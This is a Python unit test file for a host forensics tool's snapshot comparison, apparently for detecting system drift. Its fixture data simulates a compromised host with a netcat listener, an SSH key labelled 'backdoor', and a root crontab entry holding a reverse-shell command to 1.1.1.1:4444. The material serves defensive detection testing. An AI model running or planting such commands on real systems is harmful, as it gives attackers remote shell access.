# Copyright (C) 2026 Musa Jaradat
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
import unittest
from pathlib import Path
from orin.core.database import OrinStorage
from unittest.mock import patch
from orin.core.crypto import generate_signed_export
from orin.analysis.diff import load_snapshot_data, compare_snapshots

class TestDiff(unittest.TestCase):
    def setUp(self):
        self.db_path_1 = Path("test_diff_1.db")
        self.db_path_2 = Path("test_diff_2.db")
        self.export_path_1 = Path("test_diff_export_1.json")
        self.export_path_2 = Path("test_diff_export_2.json")
        
        for db_path in [self.db_path_1, self.db_path_2]:
            storage = OrinStorage(db_path)
            storage.initialize_db()

    def tearDown(self):
        for path in [self.db_path_1, self.db_path_2, self.export_path_1, self.export_path_2]:
            if path.exists():
                path.unlink()

    def test_load_snapshot_data_db(self):
        storage = OrinStorage(self.db_path_1)
        with storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'host1', 'Linux');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 80, 'TCP', 'nginx');")
            conn.execute("INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) VALUES (1, '/etc/crontab', 'root', '* * * * *', 'reboot');")
            conn.commit()
            
        data = load_snapshot_data(self.db_path_1)
        self.assertEqual(data["source"], "database")
        self.assertEqual(data["metadata"]["hostname"], "host1")
        self.assertEqual(len(data["ports"]), 1)
        self.assertEqual(data["ports"][0]["port"], 80)
        self.assertEqual(len(data["crontabs"]), 1)
        self.assertEqual(data["crontabs"][0]["command"], "reboot")

    def test_load_snapshot_data_export(self):
        storage = OrinStorage(self.db_path_1)
        with storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'host1', 'Linux');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 80, 'TCP', 'nginx');")
            conn.execute("INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) VALUES (1, '/etc/crontab', 'root', '* * * * *', 'reboot');")
            conn.commit()
            
        secret = "super_secure_passphrase"
        export_bundle = generate_signed_export(self.db_path_1, 1, secret)
        self.export_path_1.write_text(export_bundle)
        
        data = load_snapshot_data(self.export_path_1, secret)
        self.assertEqual(data["source"], "export")
        self.assertEqual(data["metadata"]["hostname"], "host1")
        self.assertEqual(len(data["ports"]), 1)
        self.assertEqual(data["ports"][0]["port"], 80)
        self.assertEqual(len(data["crontabs"]), 1)
        self.assertEqual(data["crontabs"][0]["command"], "reboot")

    def test_compare_snapshots_drift(self):
        # Base Snapshot
        base_data = {
            "metadata": {"hostname": "host1", "os_platform": "Linux", "timestamp": "2026-06-03T12:00:00Z"},
            "ports": [{"port": 22, "protocol": "TCP", "process_name": "sshd"}, {"port": 80, "protocol": "TCP", "process_name": "nginx"}],
            "outbound": [{"local_ip": "127.0.0.1", "local_port": 50000, "remote_ip": "8.8.8.8", "remote_port": 53, "state": "ESTABLISHED", "process_name": "dns"}],
            "processes": [{"pid": 100, "ppid": 1, "name": "sshd", "exe": "/usr/sbin/sshd", "cmdline": "/usr/sbin/sshd -D"}],
            "kernel_modules": [{"module_name": "ext4", "memory_size": 50000, "instances_loaded": 1}],
            "users": [
                {"username": "root", "uid": 0, "gid": 0, "home_dir": "/root", "login_shell": "/bin/bash"},
                {"username": "musa", "uid": 1000, "gid": 1000, "home_dir": "/home/musa", "login_shell": "/bin/bash"}
            ],
            "ssh_keys": [{"user_account": "musa", "key_type": "ssh-ed25519", "fingerprint": "old_fp", "raw_key_comment": "old_key"}],
            "file_hashes": [{"file_path": "/etc/passwd", "sha256_hash": "hash1"}, {"file_path": "/etc/hosts", "sha256_hash": "hosts1"}],
            "crontabs": [
                {"source": "/etc/crontab", "user": "root", "schedule": "17 * * * *", "command": "run-parts /etc/cron.hourly"}
            ],
            "deleted_binaries": [{"pid": 1234, "exe": "/bin/evil", "sha256": "sha", "md5": "md5", "vault_path": "/path"}],
            "promisc_interfaces": [
                {"interface": "eth0", "flags": "0x1103", "is_promiscuous": 1},
                {"interface": "eth1", "flags": "0x1003", "is_promiscuous": 0}
            ],
            "wtmp_sessions": [{"user": "root", "line": "pts/0", "host": "1.2.3.4", "pid": 123, "login_time": "2026-06-03T12:00:00Z", "logout_time": ""}],
            "lastlog_records": [{"username": "root", "uid": 0, "line": "pts/0", "host": "1.2.3.4", "login_time": "2026-06-03T12:00:00Z"}],
            "pkg_integrity": [{"package": "sudo", "file_path": "/usr/bin/sudo", "expected_md5": "abc", "actual_md5": "def", "status": "modified"}]
        }
        
        # Target Snapshot (Modified state)
        target_data = {
            "metadata": {"hostname": "host1", "os_platform": "Linux", "timestamp": "2026-06-03T13:00:00Z"},
            "ports": [
                {"port": 22, "protocol": "TCP", "process_name": "sshd"},
                {"port": 4444, "protocol": "TCP", "process_name": "nc"} # ADDED, port 80 REMOVED
            ],
            "outbound": [], # REMOVED local_port 50000 connection
            "processes": [
                {"pid": 100, "ppid": 1, "name": "sshd", "exe": "/usr/sbin/sshd", "cmdline": "/usr/sbin/sshd -D"},
                {"pid": 200, "ppid": 1, "name": "nc", "exe": "/usr/bin/nc", "cmdline": "nc -lvnp 4444"} # ADDED
            ],
            "kernel_modules": [], # REMOVED ext4
            "users": [
                {"username": "root", "uid": 0, "gid": 0, "home_dir": "/root", "login_shell": "/bin/bash"},
                {"username": "musa", "uid": 1000, "gid": 1000, "home_dir": "/home/musa", "login_shell": "/bin/sh"} # MODIFIED shell
            ],
            "ssh_keys": [
                {"user_account": "musa", "key_type": "ssh-ed25519", "fingerprint": "fp123", "raw_key_comment": "backdoor"} # ADDED, old key REMOVED
            ],
            "file_hashes": [
                {"file_path": "/etc/passwd", "sha256_hash": "hash_changed"} # MODIFIED hash, /etc/hosts REMOVED
            ],
            "crontabs": [
                {"source": "/var/spool/cron/crontabs/alice", "user": "alice", "schedule": "* * * * *", "command": "/tmp/backup.sh"},
                {"source": "/etc/cron.d/shell", "user": "root", "schedule": "* * * * *", "command": "bash -i >& /dev/tcp/1.1.1.1/4444"}
            ],
            "deleted_binaries": [{"pid": 5678, "exe": "/bin/evil2", "sha256": "sha2", "md5": "md52", "vault_path": "/path2"}], # ADDED, old REMOVED
            "promisc_interfaces": [
                {"interface": "eth0", "flags": "0x1003", "is_promiscuous": 0}, # MODIFIED
                {"interface": "eth2", "flags": "0x1103", "is_promiscuous": 1} # ADDED, eth1 REMOVED
            ],
            "wtmp_sessions": [{"user": "alice", "line": "pts/1", "host": "1.2.3.5", "pid": 124, "login_time": "2026-06-03T13:00:00Z", "logout_time": ""}], # ADDED, old REMOVED
            "lastlog_records": [{"username": "alice", "uid": 1001, "line": "pts/1", "host": "1.2.3.5", "login_time": "2026-06-03T13:00:00Z"}], # ADDED, old REMOVED
            "pkg_integrity": [{"package": "coreutils", "file_path": "/bin/ls", "expected_md5": "123", "actual_md5": "456", "status": "missing"}] # ADDED, old REMOVED
        }
        
        diff = compare_snapshots(base_data, target_data)
        
        # Verify network ports drift
        self.assertEqual(len(diff["ports"]["added"]), 1)
        self.assertEqual(diff["ports"]["added"][0]["port"], 4444)
        self.assertEqual(len(diff["ports"]["removed"]), 1)
        self.assertEqual(diff["ports"]["removed"][0]["port"], 80)
        
        # Verify outbound connection drift
        self.assertEqual(len(diff["outbound"]["removed"]), 1)
        
        # Verify processes drift
        self.assertEqual(len(diff["processes"]["added"]), 1)
        self.assertEqual(diff["processes"]["added"][0]["name"], "nc")
        
        # Verify kernel modules drift
        self.assertEqual(len(diff["kernel_modules"]["removed"]), 1)
        self.assertEqual(diff["kernel_modules"]["removed"][0]["module_name"], "ext4")
        
        # Verify user account modifications
        self.assertEqual(len(diff["users"]["modified"]), 1)
        self.assertEqual(diff["users"]["modified"][0]["username"], "musa")
        self.assertEqual(diff["users"]["modified"][0]["changes"]["login_shell"]["new"], "/bin/sh")
        
        # Verify SSH keys drift
        self.assertEqual(len(diff["ssh_keys"]["added"]), 1)
        self.assertEqual(diff["ssh_keys"]["added"][0]["raw_key_comment"], "backdoor")
        
        # Verify FIM file hash changes
        self.assertEqual(len(diff["file_hashes"]["modified"]), 1)
        self.assertEqual(diff["file_hashes"]["modified"][0]["file_path"], "/etc/passwd")
        self.assertEqual(diff["file_hashes"]["modified"][0]["new_hash"], "hash_changed")
        
        # Verify crontabs drift
        self.assertEqual(len(diff["crontabs"]["added"]), 2)
        added_commands = [c["command"] for c in diff["crontabs"]["added"]]
        self.assertIn("/tmp/backup.sh", added_commands)
        self.assertIn("bash -i >& /dev/tcp/1.1.1.1/4444", added_commands)

        self.assertEqual(len(diff["crontabs"]["removed"]), 1)
        self.assertEqual(diff["crontabs"]["removed"][0]["command"], "run-parts /etc/cron.hourly")

        # Test printing report to hit print statements
        from orin.analysis.diff import print_diff_report
        with patch("sys.stdout") as mock_stdout:
            print_diff_report(diff)

    def test_load_snapshot_data_exceptions(self):
        # File not found
        with self.assertRaises(FileNotFoundError):
            load_snapshot_data(Path("non_existent_file_xyz.db"))

        # Value error for JSON export with no passphrase
        # Write some text so it doesn't try sqlite
        temp_file = Path("temp_text.txt")
        temp_file.write_text("just some random text")
        try:
            with self.assertRaises(ValueError):
                load_snapshot_data(temp_file, secret_key=None)
        finally:
            if temp_file.exists():
                temp_file.unlink()

    def test_print_diff_report_empty(self):
        empty_diff = {
            "metadata": {
                "base": {"hostname": "host1", "os_platform": "Linux", "timestamp": "2026-06-03T12:00:00Z"},
                "target": {"hostname": "host1", "os_platform": "Linux", "timestamp": "2026-06-03T12:00:00Z"}
            },
            "ports": {"added": [], "removed": []},
            "outbound": {"added": [], "removed": []},
            "processes": {"added": [], "removed": []},
            "kernel_modules": {"added": [], "removed": []},
            "users": {"added": [], "removed": [], "modified": []},
            "ssh_keys": {"added": [], "removed": []},
            "file_hashes": {"added": [], "removed": [], "modified": []},
            "deleted_binaries": {"added": [], "removed": []},
            "promisc_interfaces": {"added": [], "removed": [], "modified": []},
            "wtmp_sessions": {"added": [], "removed": []},
            "lastlog_records": {"added": [], "removed": []},
            "pkg_integrity": {"added": [], "removed": []},
            "crontabs": {"added": [], "removed": []}
        }
        from orin.analysis.diff import print_diff_report
        with patch("sys.stdout") as mock_stdout:
            print_diff_report(empty_diff)
